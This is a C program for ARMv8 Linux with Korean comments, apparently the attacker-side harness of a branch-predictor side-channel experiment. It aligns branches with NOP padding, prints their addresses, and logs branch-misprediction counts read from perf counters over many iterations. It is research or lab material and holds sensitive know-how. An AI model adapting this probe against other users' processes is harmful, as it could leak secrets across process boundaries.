#define _GNU_SOURCE
#include <linux/perf_event.h>
#include <asm/unistd.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <math.h>

#include "common.h"

#ifndef PMU_TYPE_ARMV8_PMUV3
// 네 장비에서 확인한 값 사용
#define PMU_TYPE_ARMV8_PMUV3 7
#endif

// /sys/bus/event_source/devices/armv8_pmuv3/events/cpu_cycles → event=0x11
#define EVENT_CPU_CYCLES 0x11
#define EVENT_BR_MIS_PRED 0x10
#define EVENT_BR_MIS_PRED_RETIRED 0x22
#define EVENT_L1I_CACHE 0x14
#define EVENT_L1I_CACHE_REFILL 0x1

static long
perf_event_open(struct perf_event_attr *hw_event,
                pid_t pid, int cpu, int group_fd, unsigned long flags)
{
    return syscall(__NR_perf_event_open, hw_event, pid, cpu, group_fd, flags);
}

void dummy1(void)
{
    /* PAD1 start */
    NOP_REPEAT(7926);
/* PAD1 end */
}

ATTR
uint64_t outer(int input)
{
    /* PADFINE1 start */
    NOP_REPEAT(10);
/* PADFINE1 end */

    struct perf_event_attr pe;
    memset(&pe, 0, sizeof(pe));

    pe.type = PMU_TYPE_ARMV8_PMUV3;  // = 7
    pe.size = sizeof(struct perf_event_attr);
    pe.config = EVENT_BR_MIS_PRED;    // = event ID

    // 처음엔 비활성화: 우리가 ENABLE 시킨 시점부터만 카운트
    pe.disabled = 1;

    // 유저 모드만 측정 (EL0), 커널/하이퍼바이저 제외
    pe.exclude_kernel = 1;
    pe.exclude_hv = 1;

    // 현재 프로세스(pid=0), 현재 스레드가 도는 CPU( cpu = -1 ) 기준
    int fd = perf_event_open(&pe, 0, -1, -1, 0);
    if (fd == -1) {
        perror("perf_event_open");
        return 0;
    }

    // 카운터 초기화 후 시작
    if (ioctl(fd, PERF_EVENT_IOC_RESET, 0) == -1) {
        perror("ioctl RESET");
    }
    if (ioctl(fd, PERF_EVENT_IOC_ENABLE, 0) == -1) {
        perror("ioctl ENABLE");
    }
    __asm__ volatile ("isb" ::: "memory");

    // === 여기 사이가 측정 구간 ===
    __asm__ volatile (
        ".global branch1_eq_label      \n\t"
        "cmp    %w[input], #0          \n\t"
        "branch1_eq_label:             \n\t"
        "b.eq   branch1_end            \n\t"  // input == 0 -> NOP들 건너뛰기

        "branch1_if:                   \n\t"
        ".rept 1                       \n\t"
        "nop                           \n\t"
        ".endr                         \n\t"

        "branch1_end:                  \n\t"
        :
        : [input] "r"(input)
        : "cc", "memory"
    );
    // ============================

    __asm__ volatile ("dsb sy" ::: "memory");
    __asm__ volatile ("isb" ::: "memory");
    if (ioctl(fd, PERF_EVENT_IOC_DISABLE, 0) == -1) {
        perror("ioctl DISABLE");
    }
    __asm__ volatile ("isb" ::: "memory");

    uint64_t count = 0;
    if (read(fd, &count, sizeof(count)) != sizeof(count)) {
        perror("read");
        count = 0;
    }

    close(fd);
    return count;
}

void dummy2()
{
    /* PAD2 start */
    NOP_REPEAT(8000);
    NOP_REPEAT(8000);
    NOP_REPEAT(8000);
    NOP_REPEAT(7884);
/* PAD2 end */
}

// func() 실행 시 걸린 유저 모드 cpu_cycles만 리턴
ATTR
uint64_t inner(int input)
{
    /* PADFINE2 start */
    NOP_REPEAT(10);
/* PADFINE2 end */

    struct perf_event_attr pe;
    memset(&pe, 0, sizeof(pe));

    pe.type = PMU_TYPE_ARMV8_PMUV3;  // = 7
    pe.size = sizeof(struct perf_event_attr);
    pe.config = EVENT_BR_MIS_PRED;    // = event ID

    // 처음엔 비활성화: 우리가 ENABLE 시킨 시점부터만 카운트
    pe.disabled = 1;

    // 유저 모드만 측정 (EL0), 커널/하이퍼바이저 제외
    pe.exclude_kernel = 1;
    pe.exclude_hv = 1;

    // 현재 프로세스(pid=0), 현재 스레드가 도는 CPU( cpu = -1 ) 기준
    int fd = perf_event_open(&pe, 0, -1, -1, 0);
    if (fd == -1) {
        perror("perf_event_open");
        return 0;
    }

    // 카운터 초기화 후 시작
    // if (ioctl(fd, PERF_EVENT_IOC_RESET, 0) == -1) {
    //     perror("ioctl RESET");
    // }
    // if (ioctl(fd, PERF_EVENT_IOC_ENABLE, 0) == -1) {
    //     perror("ioctl ENABLE");
    // }
    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    __asm__ volatile ("isb" ::: "memory");

    // === 여기 사이가 측정 구간 ===
    __asm__ volatile (
        ".global branch2_eq_label  \n\t"
        ".global branch2_else      \n\t"
        "cmp    %w[input], #0      \n\t"   // input == 0 ?
        "branch2_eq_label:         \n\t"  // ← 분기 명령어 바로 앞에 label
        "b.eq   branch2_else       \n\t"   // if == 0 -> jump to else
        "branch2_if:               \n\t"
        ".rept 1                \n\t"   // then 블록
        "nop                       \n\t"
        ".endr                     \n\t"
        "b     branch2_end         \n\t"   // 끝으로 점프
        "branch2_else:             \n\t"
        ".rept 1                \n\t"   // then 블록
        "nop                       \n\t"
        ".endr                     \n\t"
        "nop                       \n\t"   // else 블록
        "branch2_end:              \n\t"
        :
        : [input] "r"(input)
        : "cc", "memory"
    );
    // ============================

    __asm__ volatile ("dsb sy" ::: "memory");
    __asm__ volatile ("isb" ::: "memory");
    if (ioctl(fd, PERF_EVENT_IOC_DISABLE, 0) == -1) {
        perror("ioctl DISABLE");
    }

    uint64_t count = 0;
    if (read(fd, &count, sizeof(count)) != sizeof(count)) {
        perror("read");
        count = 0;
    }

    close(fd);
    return count;
}

int main(){
    uint64_t addr1, addr2;
    __asm__ volatile(
        "ldr    %0, =branch1_eq_label\n\t"   // 절대 주소 로드
        "ldr    %1, =branch2_eq_label\n\t"
        : "=r"(addr1), "=r"(addr2)
        :
        : 
    );
    printf("[ATK] address of outer branch: %p\n", (void*)addr1);
    printf("[ATK] address of inner branch: %p\n", (void*)addr2);
    fflush(stdout);

    uint64_t (*lines)[4] = malloc(sizeof(uint64_t[MAX_LINES][4]));
    if (!lines) {
        perror("malloc failed");
        return 0;
    }

    struct timespec ts, t1, t2;
    int n = 0;

    FILE *fp = fopen("p2.txt", "w");

    /* branchless */
    uint64_t counter = 0;
    uint64_t limit = 100000;
    uint64_t br_mis_pred, now;

    // 종료 조건이 명시적 branch 없이 평가되도록 만듦
    while (1) {
        delay(100000);

        br_mis_pred = inner(0); // attacker branch
        
        __asm__ volatile ("dsb sy" ::: "memory");
        __asm__ volatile ("isb" ::: "memory");        
        asm volatile("mrs %0, cntvct_el0" : "=r"(now));
        __asm__ volatile ("isb" ::: "memory");
        lines[n][0] = now;
        lines[n][1] = br_mis_pred;
        n++;

        // 탈출 처리
        uint64_t diff = counter - limit;
        uint64_t continue_mask = (diff >> 63) & 1;  // 1이면 반복, 0이면 종료

        // 종료 처리 - branch 없이 loop 탈출
        // 방법: break_mask를 포인터에 곱해서 null이면 no-op, 아니면 break
        void* targets[] = {&&break_loop, &&continue_loop};
        goto *targets[continue_mask];

continue_loop:
        counter++;
    }

break_loop:
    printf("Loop ended at counter = %lu\n", counter);

    for (int i = 0; i < n; ++i) {
        fprintf(fp, "%lu, %lu\n", lines[i][0], lines[i][1]);
    }
    /* branchless */

    fclose(fp);
    free(lines);
    printf("Attacker(Parent) End\n");

    return 0;
}